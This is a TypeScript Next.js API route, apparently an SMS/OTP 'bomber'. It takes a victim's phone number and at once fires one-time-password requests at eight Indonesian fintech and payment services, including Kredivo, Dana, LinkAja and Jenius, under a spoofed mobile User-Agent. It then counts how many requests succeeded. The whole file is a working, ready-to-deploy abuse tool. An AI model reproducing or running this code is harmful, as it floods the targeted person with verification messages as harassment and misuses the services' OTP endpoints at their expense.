import { NextRequest, NextResponse } from 'next/server'

export const maxDuration = 10

async function hit(platform: string, url: string, method: string, body: any, headers: any = {}) {
  try {
    const controller = new AbortController()
    setTimeout(() => controller.abort(), 4000)
    const res = await fetch(url, {
      method,
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Accept': 'application/json',
        ...headers
      },
      body: method === 'GET' ? undefined : JSON.stringify(body),
      signal: controller.signal
    })
    return { platform, success: res.status >= 200 && res.status < 300, status: res.status }
  } catch {
    return { platform, success: false, status: 0 }
  }
}

export async function GET(req: NextRequest) {
  const { searchParams } = new URL(req.url)
  const phone = searchParams.get('phone')

  if (!phone) {
    return NextResponse.json({ status: false, message: 'Parameter phone wajib diisi' }, { status: 400 })
  }

  const p = phone.replace(/^0/, '62')
  const p62 = phone.startsWith('62') ? phone : `62${phone.slice(1)}`
  const p08 = phone.startsWith('0') ? phone : `0${phone.slice(2)}`

  const results = await Promise.all([
    hit('Koinworks', 'https://koinworks.com/api/v1/users/otp', 'POST', { phone_number: p08 }),
    hit('Kredivo', 'https://api.kredivo.com/kredivo/v2/user/request_otp', 'POST', { phone: p62 }),
    hit('Akulaku', 'https://id-api.akulaku.com/user-web/api/v1/user/sendSmsCode', 'POST', { mobile: p62, type: 1 }),
    hit('Dana', 'https://m.dana.id/d/portal/v1/otp/send', 'POST', { mobileNo: p08, bizSceneId: 'REGISTER' }),
    hit('LinkAja', 'https://app.linkaja.id/api/v3/user/otp', 'POST', { msisdn: p62 }),
    hit('Flip', 'https://flip.id/api/v1/user/send-otp', 'POST', { phone: p08 }),
    hit('SeaBank', 'https://www.seabank.co.id/api/v1/otp/send', 'POST', { phoneNumber: p62 }),
    hit('Jenius', 'https://www.jenius.com/api/v2/auth/otp', 'POST', { phone: p08 }),
  ])

  const berhasil = results.filter(r => r.success).length
  const gagal = results.filter(r => !r.success).length

  return NextResponse.json({
    status: true,
    phone,
    total: results.length,
    berhasil,
    gagal,
    detail: results,
    author: 'Egii Apii'
  })
}
